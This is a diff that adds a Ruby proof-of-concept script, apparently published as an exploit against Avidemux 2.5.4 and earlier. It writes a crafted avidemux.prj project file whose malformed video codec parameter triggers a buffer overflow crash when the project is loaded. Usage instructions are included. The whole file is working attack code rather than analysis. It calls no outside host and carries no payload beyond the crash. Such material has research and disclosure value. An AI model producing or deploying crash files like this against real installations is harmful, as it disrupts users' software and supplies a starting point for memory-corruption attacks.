@@ -1,0 +1,63 @@
+#!/usr/bin/env ruby
+# avidemux_crash.rb
+#
+# Title		:	Avidemux <= 2.5.4 Buffer Overflow PoC
+# Date		:	31.10.2010
+# Version	: 	<= 2.5.4
+# Software Link	: 	http://avidemux.sourceforge.net/download.html / http://avidemux.razorbyte.com.au/
+# Author	:	The_UnKn@wn
+# Email		: 	the_unknown [at] group51 [dot] org
+# Homepage	: 	http://group51.org
+# Tested on	:	openSUSE 11.3 and Windows XP SP3 English
+#
+# Usage:
+# 	ruby avidemux_crash.rb <a *.mpg file>
+# 	Start Avidemux --> Load/Run Project --> crash!!
+#
+# Note:
+# 	You can also use another video file format you would have to change the Format in Line and maybe some other stuff #54 too
+#
+
+file = ARGV[0]
+
+if file.nil?
+	puts "Usage: ruby #{__FILE__} <path to sample video .mpg file>"
+	exit
+end
+name = "avidemux.prj"
+
+text = "//AD  <- Needed to identify//\n" +
+"//--automatically built--\n"+
+"var app = new Avidemux();\n"+
+"//** Video **\n"+
+"// 01 videos source \n"+
+"app.load(\"#{file}\");\n"+
+"//01 segments:\n"+
+"app.clearSegments();\n"+
+"app.addSegment(0,0,157699);\n"+
+"app.markerA=0;\n"+
+"app.markerB=77543;\n"+
+"app.rebuildIndex();\n"+
+"//** Postproc **\n"+
+"app.video.setPostProc(3,3,0);\n"+
+"app.video.fps1000 = 25000;\n"+
+"//** Filters **\n"+
+"//** Video Codec conf **\n"+
+"app.video.codec(\"Copy\", \"CQ=4\", \"200 \"); \n"+ # <-- here is the vuln app.video.codec("Copy","CQ=4","0 ");
+"//** Audio **\n"+
+"app.audio.reset();\n"+
+"app.audio.codec(\"copy\",-1078515528,0,\"\");\n"+
+"app.audio.normalizeMode=0;\n"+
+"app.audio.normalizeValue=0;\n"+
+"app.audio.delay=0;\n"+
+"app.audio.mixer=\"NONE\";\n"+
+"app.setContainer(\"AVI\");\n"+
+"setSuccess(1);\n"+
+"//app.Exit();\n"+
+"//End of script"
+
+File.open(name, "w") do |f|
+	f.puts(text)
+end
+
+puts "File #{name} has been created successfully"
